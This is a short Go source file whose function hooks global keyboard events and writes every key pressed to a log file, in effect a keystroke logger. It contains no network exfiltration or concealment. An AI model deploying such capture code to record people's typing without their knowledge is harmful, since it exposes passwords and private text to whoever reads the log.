package main

import (
	"fmt"
	"os"

	hook "github.com/robotn/gohook"
)

func StartEventWriter() {
	file, err := openLogFile()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create log file: %v\n", err)
	}
	defer file.Close()

	events := hook.Start()
	for ev := range events {

		if ev.Kind == hook.KeyHold {
			if ev.Rawcode == 8 {
				file.WriteString("Backspace\n")
			} else if ev.Rawcode == 32 {
				file.WriteString("Space\n")
			} else if ev.Rawcode == 13 { //change magic num
				file.WriteString("Enter\n")
			} else {
				text := string(ev.Keychar) + "\n"
				file.WriteString(text)
			}
		}
	}
}
